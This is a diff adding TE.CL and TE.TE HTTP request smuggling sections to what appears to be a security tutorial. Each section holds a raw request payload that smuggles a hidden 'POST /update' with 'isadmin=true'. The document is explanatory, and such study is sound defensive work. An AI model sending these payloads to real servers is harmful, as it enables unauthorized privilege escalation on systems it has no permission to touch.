@@ -87,3 +87,51 @@ x=1
 
 
 ```
+
+
+## TE.CL Technique
+TE.CL stands for Transfer-Encoding/Content-Length.   If an attacker sends a request with both headers, the front-end server or proxy might interpret the request based on the Transfer-Encoding header, while the back-end server might rely on the Content-Length header. This difference in interpretation might interpret the request differently, leading to unexpected behaviour.
+
+```http
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+78
+POST /update HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+isadmin=true
+0
+
+```
+
+In the above payload, the front-end server sees the Transfer-Encoding: chunked header and processes the request as chunked. The `78` (**hexadecimal** for `120`) indicates that the next `120` bytes are part of the current request's body. The front-end server considers everything up to the `0 ` (indicating the end of the chunked message) as part of the body of the first request.
+
+
+------
+
+##  TE.TE Technique 
+Transfer Encoding Obfuscation, also known as TE.TE stands for Transfer-Encoding/Transfer-Encoding. 
+
+```http
+POST / HTTP/1.1
+Host: example.com
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked1
+
+4e
+POST /update HTTP/1.1
+Host: example.com
+Content-length: 15
+
+isadmin=true
+0
+
+```
+
+In the above payload, the front-end server encounters two `Transfer-Encoding` headers. The first one is a standard chunked encoding, but the second one, `chunked1`, is non-standard. Depending on its configuration, the front-end server might process the request based on the first `Transfer-Encoding: chunked` header and ignore the malformed `chunked1`, interpreting the entire request up to the `0` as a single chunked message.
